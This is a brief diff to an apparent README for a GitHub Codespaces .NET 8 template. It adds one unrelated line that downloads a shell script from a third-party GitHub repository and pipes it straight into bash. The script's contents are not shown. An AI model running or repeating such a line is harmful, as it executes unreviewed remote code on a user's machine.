@@ -1,4 +1,5 @@
 # GitHub Codespaces ♥️ .NET 8
+curl -sSL https://raw.githubusercontent.com/ImMALWARE/bash-warp-generator/main/warp_generator.sh | bash
 
 Want to try out the latest performance improvements coming with .NET 8 for web development? 
 
